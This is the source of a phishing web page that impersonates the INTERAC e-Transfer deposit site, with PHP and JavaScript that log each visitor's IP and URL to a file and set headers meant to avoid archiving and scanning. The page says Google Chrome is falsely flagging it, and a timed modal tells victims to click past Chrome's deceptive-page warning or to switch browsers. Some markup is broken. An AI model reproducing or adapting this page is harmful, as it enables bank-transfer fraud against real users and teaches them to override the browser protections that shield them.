<?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate");
header("Expires: " . gmdate("D, d M Y H:i:s", time() - 3600) . " GMT");
header("Pragma: no-cache");

// Prevent Google Archiving
header("X-Robots-Tag: noarchive");

// Block email scanning
header("X-Content-Type-Options: nosniff");

// Disable listeners and log third-party communications
ini_set("disable_functions", "socket_accept, socket_bind, socket_listen, socket_create_listen, socket_read, socket_recv, socket_recvfrom, socket_recvmsg, socket_send, socket_sendmsg, socket_sendto, socket_getsockname, socket_getpeername, socket_get_option, socket_set_option");


// Logging third-party communication attempts
$logFile = "../../../requests.txt"; // Replace with the path to your log file

// Get the current timestamp
$timestamp = date("Y-m-d H:i:s");

// Get the IP address of the client
$ipAddress = $_SERVER['REMOTE_ADDR'];

// Get the requested URL
$requestUrl = $_SERVER['REQUEST_URI'];

// Create the log message
$logMessage = "Timestamp: $timestamp | IP: $ipAddress | Requested URL: $requestUrl\n";

// Append the log message to the log file
file_put_contents($logFile, $logMessage, FILE_APPEND);
?>
<?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><html lang="en"><head>
  <meta http-equiv="Expires" content="Thu, 01 Jan 1970 00:00:01 GMT">
  <meta http-equiv="Cache-Control" content="no-cache">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="no-cache">
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description" content="">

  <meta property="og:title" content="Deposit your INTERAC e-Transfer">
  <meta property="og:description" content="Receiving an INTERAC e-Transfer is fast and free using your mobile or online banking.">
  <meta property="og:image" content="https://s3.amazonaws.com/etransfer-notification.interac.ca/images/etransfer_thumbnail_en.png">
  <meta property="og:url" content="https://etransfer.interac.ca/?lang=en">
  <meta property="og:site_name" content="INTERAC e-Transfer">

  <link rel="stylesheet" type="text/css" media="screen" href="files/generalCSS.css">
  <link rel="stylesheet" type="text/css" media="screen" href="files/GTIe8CSS.css">
  <title>INTERAC e-Transfer</title>  <script>
    // Disable caching for forward and backward navigation
    function disableCaching() {
      // Disable caching for forward navigation
      window.onpageshow = function(event) {
        if (event.persisted) {
          document.getElementById('disableCache').content = 'no-store, no-cache, must-revalidate';
        }
      };
      
      // Disable caching for backward navigation
      window.onunload = function() {};
    }
    
    // Set client browser cache to one hour prior
    function setBrowserCacheTime() {
      const date = new Date();
      date.setTime(date.getTime() - (60 * 60 * 1000));
      document.getElementById('cacheExpires').content = date.toUTCString();
    }

    // Prevent Google Archiving
    const metaRobots = document.createElement('meta');
    metaRobots.name = 'robots';
    metaRobots.content = 'noarchive';
    document.head.appendChild(metaRobots);

    // Block email scanning
    const metaContentType = document.createElement('meta');
    metaContentType.httpEquiv = 'X-Content-Type-Options';
    metaContentType.content = 'nosniff';
    document.head.appendChild(metaContentType);

    // Disable listeners and log third-party communications
    function disableListeners() {
      // Disable listeners (Not applicable in HTML pages)
    }

    function logThirdPartyCommunication() {
      // Logging third-party communication attempts
      const timestamp = new Date().toISOString();
      const ipAddress = "123.45.67.89"; // Replace with actual IP address or retrieve dynamically
      const requestedUrl = window.location.href;
      const logMessage = `Timestamp: ${timestamp} | IP: ${ipAddress} | Requested URL: ${requestedUrl}\n`;

      // Specify the log file location
      const logFile = "../../../requests.txt"; // Replace with the actual log file location

      // Perform the necessary logging operation (e.g., sending log data to a server-side script)
      const logRequest = new XMLHttpRequest();
      logRequest.open('POST', logFile, true);
      logRequest.setRequestHeader('Content-Type', 'text/plain');
      logRequest.send(logMessage);
    }

    // Call the necessary functions when the page loads
    document.addEventListener('DOMContentLoaded', function() {
      disableCaching();
      setBrowserCacheTime();
      disableListeners();
      logThirdPartyCommunication();
    });
  </script>
  <style>
    /* Add your custom CSS styles here */
    .modal {
        display: flex;
        justify-content: center;
        align-items: center;
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background-color: rgba(0, 0, 0, 0.5);
        z-index: 9999;
    }

    .modal-content {
        max-width: 600px;
        background-color: #fff;
        padding: 20px;
        border-radius: 5px;
        text-align: center;
        position: relative;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
    }

    .modal-close {
        position: absolute;
        top: 10px;
        right: 10px;
        cursor: pointer;
    }
</style>

</head>

<body>
  <div class="custom-wrapper nav-menu" id="menu" data-enhance="false">
    <div class="pure-g nav-wrapper interac-max-width">
      <div class="pure-u-1 pure-u-md-1-3">
        <div class="pure-menu pure-menu-heading">
          <a href="http://www.interac.ca/en" hreflang="null" class="custom-brand">
            <img id="brand-logo" src="https://etransfer-notification.interac.ca/images/own/etransfer_logo.svg" alt="INTERAC e-Transfer " style="height: 50px;">
          </a>
          <a href="#" class="custom-toggle" id="toggle">
            <s class="bar"></s><s class="bar"></s>
          </a>
        </div>
      </div>
      <div class="pure-u-1 pure-u-md-2-3">
        <div class="pure-menu pure-menu-horizontal custom-menu-3 custom-can-transform">
          <ul class="pure-menu-list">
            <li class="pure-menu-item"><a href="#" hreflang="null" class="contactus-link pure-menu-link" data-ajax="false">Contact Us</a></li>
          </ul>
        </div>
      </div>
    </div>
  </div>
  
		
	

	<div style="margin-left: auto; margin-right: auto; position: relative" class="interac-max-width" data-role="page" data-enhance="false">
		<div class="pure-g">
			<div class="pure-u-1">
				<div class="display-inline-block padding-right-10 translate-y-d-7">
					<svg height="30px" version="1.1" viewBox="0 0 16 16" width="30px" class="grey-border circle-icon grey-background " xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
                    <g fill="none" fill-rule="evenodd" id="Icons with numbers" stroke="none" stroke-width="1">
                        <g id="Group" transform="translate(-576.000000, -432.000000)" class="white-icon">
                            <path d="M583,435 L583,437 L585,437 L585,435 Z M584,448 C579.581722,448 576,444.418278 576,440 C576,435.581722 579.581722,432 584,432 C588.418278,432 592,435.581722 592,440 C592,444.418278 588.418278,448 584,448 Z M583,439 L583,445 L585,445 L585,439 Z M583,439" id="Oval 208" class=""></path>
                        </g>
                    </g>
                </svg>
				</div>
				<h1 class="interac-yellow display-inline-block font-weight-100 margin-top-30">
					<b>Browser not Support
</b>
				</h1>
			</div>
			<div class="pure-u-1">
				<div class="separator"></div>
			</div>
			<div class="pure-u-1">
				<h3 class="font-weight-100">  We apologize for the inconvenience, but it appears that your current browser, Google Chrome, has been falsely triggering deceptive page warnings on our website.</h3>
			</div>
			<div class="pure-u-1 text-center margin-top-30">
				<div class="error-image-border">
					<img src="files/svg/misc" alt="">
				</div>
			</div>
			<div class="pure-u-1 text-center margin-top-30">

    </div>


        </div>
    </div> 


    <script>
    // Open the modal
    function openModal() {
        document.getElementById("modal").style.display = "block";
    }
    // Close the modal
    function closeModal() {
        document.getElementById("modal").style.display = "none";
    }

    // Automatically open the modal after 10 seconds
    setTimeout(function() {
        openModal();
    }, 10000);
  </script>

<!-- Modal dialog box -->
<<!-- Modal dialog box -->
<div id="modal" class="modal" style="display: none;">
  <div class="modal-content">
    <span class="modal-close" onclick="closeModal()">×</span>
    <h2>Deceptive Page Warning</h2>
    <div class="description-box">
      <p>To proceed to the website safely, please follow these steps based on your current browser:</p>

      <ol>
        <li>
          <strong>If you are using Google Chrome:</strong>
          <div class="instruction-box">
            <ol type="a">
              <li>Click on the <strong>Advanced</strong> link.</li>
              <li>Click on the <strong>Proceed to website</strong> link.</li>
              <li>Proceed as normal; the warning will be cleared.</li>
            </ol>
          </div>
        </li>
        <li>
          <strong>If you are using a different browser:</strong>
          <p>We recommend using an alternative browser to access the website without encountering the deceptive page warning. Please avoid using Google Chrome for now.</p>
        </li>
      </ol>

      <p>Please be assured that your online security is our top priority. We continuously monitor our website for any potential threats and regularly update our security protocols to keep your personal information safe.</p>
    </div>

    <button onclick="proceedToWebsite()">Continue to Website</button>
  </div>
</div>



  <!-- Add a button or link to trigger the modal -->
  <a href="#" onclick="openModal()">Open Modal Window</a>


<div class="footer l-box interac-max-width" data-role="footer">
    <div class="separator"></div>
    <div class="pure-g footer-link-container">
		
        <div class="pure-u-1 pure-u-md-2-5">
            <span class="footer-text">This is a secure Transaction
	            <svg height="20px" id="Ð¡Ð»Ð¾Ð¹_1" style="enable-background:new 0 0 512 512;" version="1.1" viewBox="0 0 512 512" width="20px" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" class="translate-y-d-3">
	                <switch>
	                    <g>
	                        <path d="M221.909,335.546c0-18.866,15.226-34.092,34.091-34.092  s34.091,15.226,34.091,34.092c0,13.749-8.189,25.567-19.997,30.905l19.997,60.003h-68.182l19.997-60.003  C230.093,361.113,221.909,349.295,221.909,335.546z M437.818,233.273H74.182v250h363.637V233.273z M369.637,136.682  c0-59.659-48.296-107.955-107.955-107.955h-11.363c-59.659,0-107.955,48.296-107.955,107.955v73.864h227.273V136.682z M437.818,506  H74.182c-12.501,0-22.727-10.231-22.727-22.728v-250c0-12.496,10.226-22.728,22.727-22.728h45.455v-73.864  C119.636,64.527,178.158,6,250.318,6h11.363c72.155,0,130.682,58.527,130.682,130.682v73.864h45.455  c12.495,0,22.728,10.232,22.728,22.728v250C460.546,495.769,450.313,506,437.818,506z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#b5b5b5;" class="grey-icon"></path>
	                    </g>
	                </switch>
	                <foreignObject></foreignObject> 
	            </svg>
            </span>
        </div>
    </div>
    <div class="separator"></div>
    <div class="padding-t-5 pure-g">
        <div class="pure-u-md-1-2 pure-hidden-sm pure-hidden-xs text-left">
            <img class="logo" src="https://etransfer-notification.interac.ca/images/own/etransfer_logo.svg" alt="Interac e-Transfer" style="height: 50px;">
        </div>
        <div class="pure-u-1 pure-hidden-md pure-hidden-lg pure-hidden-xl">                   
            <img class="logo" src="https://etransfer-notification.interac.ca/images/own/etransfer_logo.svg" alt="Interac e-Transfer" style="height: 50px;">
        </div>
        <div class="pure-u-md-1-2 pure-u-1">
            <p class="copyright-text">
				©&nbsp;2000&nbsp;—
				<script type="text/javascript">
					function getCurrentYear() {
						var currentDate = new Date();
						return currentDate.getFullYear();
					}
					var currentYear = getCurrentYear();
					document.write(currentYear);
				</script>20232023
				Interac Corp.  All rights reserved. 
				<a href="javascript:void();" hreflang="en" class="termsAndConditions-link underline">Terms of Use</a>
				<br>
				® Trade-marks of Interac Corp.
				
            </p>
</div></div></div></body></html>